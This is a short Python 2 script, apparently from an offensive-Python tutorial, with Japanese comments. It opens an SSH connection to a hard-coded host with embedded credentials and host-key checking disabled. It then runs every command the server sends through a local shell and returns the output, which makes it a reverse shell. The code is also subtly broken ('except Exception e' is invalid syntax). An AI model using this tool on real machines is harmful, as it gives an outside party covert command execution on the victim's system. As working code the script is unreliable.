# -*- coding: utf-8 -*-

import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/home/justin/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session=client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        #バナー情報読み取り
        print ssh_session.recv(1024)
        while True:
            #SSHサーバからコマンド受け取り
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception e:
                ssh_session.send(str(e))
        client.close()
    return

ssh_command('192.168.233.251', 'justin', 'lovesthepython', 'ClientConeccted')
